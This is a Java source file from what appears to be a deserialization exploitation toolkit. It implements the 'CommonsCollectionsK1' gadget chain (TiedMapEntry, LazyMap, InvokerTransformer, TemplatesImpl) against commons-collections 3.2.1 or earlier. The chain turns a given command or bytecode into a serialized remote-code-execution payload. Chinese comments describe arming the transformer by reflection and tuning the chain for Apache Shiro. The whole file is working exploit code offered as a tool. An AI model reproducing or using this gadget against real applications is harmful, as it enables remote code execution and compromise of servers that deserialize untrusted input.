package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

/**
 * 依赖：commons-collections:commons-collections:<=3.2.1
 * 原理：TiedMapEntry -> LazyMap -> InvokerTransformer -> TemplatesImpl.newTransformer()
 * 优势：不使用 Transformer 数组，Shiro 反序列化不会报错
 */
public class CommonsCollectionsK1 implements ObjectPayload, BytecodePayload {

    @Override
    public Object getObject(String command) throws Exception {

        Object tpl = TemplatesBytecodeGenerator.createTemplatesImpl(command);
        // 1. 先创建一个无害的 InvokerTransformer，防止本地序列化时触发
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // 2. 构造 LazyMap
        HashMap<String, String> innerMap = new HashMap<>();
        Map m = LazyMap.decorate(innerMap, transformer);

        // 3. 构造 TiedMapEntry，将 TemplatesImpl 作为 Map 的 key
        TiedMapEntry tied = new TiedMapEntry(m, tpl);

        // 4. 将 TiedMapEntry 放入外部 Map
        Map<Object, Object> outerMap = new HashMap<>();
        outerMap.put(tied, "t");

        // 5. 清理 innerMap，确保 get 时触发 transform
        innerMap.clear();

        // 6. 反射修改方法名为 newTransformer，完成武器化
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }

    @Override
    public Object getObjectWithBytecode(byte[] bytecode) throws Exception {
        Object tpl = TemplatesBytecodeGenerator.createTemplatesImplWithBytecode(bytecode);
        // 1. 先创建一个无害的 InvokerTransformer，防止本地序列化时触发
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // 2. 构造 LazyMap
        HashMap<String, String> innerMap = new HashMap<>();
        Map m = LazyMap.decorate(innerMap, transformer);

        // 3. 构造 TiedMapEntry，将 TemplatesImpl 作为 Map 的 key
        TiedMapEntry tied = new TiedMapEntry(m, tpl);

        // 4. 将 TiedMapEntry 放入外部 Map
        Map<Object, Object> outerMap = new HashMap<>();
        outerMap.put(tied, "t");

        // 5. 清理 innerMap，确保 get 时触发 transform
        innerMap.clear();

        // 6. 反射修改方法名为 newTransformer，完成武器化
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }

}